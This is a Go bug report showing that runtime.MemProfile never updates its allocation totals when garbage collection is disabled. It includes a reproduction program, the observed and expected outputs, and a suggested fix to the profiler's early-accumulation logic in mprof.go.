### Output of `go env` in your module/workspace:

```shell
N/A
```

### What did you do?

Ran this program:

```go
package main

import (
	"fmt"
	"runtime"
	"runtime/debug"
)

func sampledAllocs() int64 {
	n, _ := runtime.MemProfile(nil, true)
	var p []runtime.MemProfileRecord
	for {
		p = make([]runtime.MemProfileRecord, n+50)
		var ok bool
		n, ok = runtime.MemProfile(p, true)
		if ok {
			break
		}
	}
	var allocs int64
	for _, r := range p[:n] {
		allocs += r.AllocBytes
	}
	return allocs
}

func main() {
	debug.SetGCPercent(-1)
	runtime.MemProfileRate = 1
	var b [][]byte
	for range 4 {
		b = append(b, make([]byte, 1<<20))
		var stats runtime.MemStats
		runtime.ReadMemStats(&stats)
		fmt.Println(sampledAllocs(), stats.HeapAlloc)
	}
	runtime.KeepAlive(b)
}

```

### What did you see happen?

The number of bytes allocated, estimated by the profiler, is the same every time:

```
% go run .
1050720 1232328
1050720 2298976
1050720 3366096
1050720 4433120
```

### What did you expect to see?

I expected the value to update as the program did more allocation. Something closer to:

```
% go run .
1067104 1252832
2135800 2319480
3202920 3386600
4269944 4453624
```

From the `runtime/pprof` [docs](https://pkg.go.dev/runtime/pprof#hdr-Heap_profile-Profile): "If there has been no garbage collection at all, the heap profile reports all known allocations."

---

In `memProfileInternal` we'll accumulate memory profile data into the "active" records early if we don't see any non-zero values, under the assumption that GC hasn't happened yet: https://github.com/golang/go/blob/go1.27.1/src/runtime/mprof.go#L964-L982. But after that, we'll see non-zero values in the active records. That means we won't accumulate again, even if GC still hasn't happened.

Fixing this seems a little tricky. The memory profiler has a multi-cycle accumulation strategy, intended to give a consistent heap snapshot and avoid biasing towards allocs, where an allocation won't be counted in the "active" record until two mark terminations after when it was sampled. Maybe the right approach is to do early accumulation until we've seen two mark terminations (e.g. until `mProf_NextCycle` is called twice) following the first sample? After that point I think we'd want to stop doing early accumulation and follow the normal multi-cycle accumulation scheme.

Of course, if someone isn't trying to completely avoid doing GC, they can just call `runtime.GC()` and get an up-to-date profile.
